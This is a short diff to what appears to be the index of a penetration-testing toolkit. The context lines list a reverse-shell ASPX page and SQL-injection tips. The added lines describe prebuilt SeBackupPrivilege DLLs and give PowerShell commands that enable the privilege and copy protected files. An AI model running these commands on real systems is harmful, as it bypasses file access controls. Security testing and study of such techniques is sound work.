@@ -82,6 +82,17 @@ reverse_shell.aspx
 '-->  Not my creation, credit goes to INSOMNIA SECURITY :: InsomniaShell.aspx, 
       brett.moore@insomniasec.com ::  www.insomniasec.com
 
+SeBackupCmdLets.dll
+SeBackupUtils.dll
+|
+'--> Precompiled dlls from https://github.com/giuliano108/SeBackupPrivilege for leveraging 
+     SeBackupPrivileged AD account. These are prebuilt x64, if you need other then you
+     need to build them yourself from giuliano's source. Otherwise:
+            Import-Module .\SeBackupPrivilegeUtils.dll
+            Import-Module .\SeBackupPrivilegeCmdLets.dll
+            Set-SeBackupPrivilege
+            Copy-FileSeBackupPrivilege .\un_accessible_document.pdf c:\temp\now_accessible.pdf -Overwrite
+
 sqli-tips
 |
 '-->  Tips for SQL injections
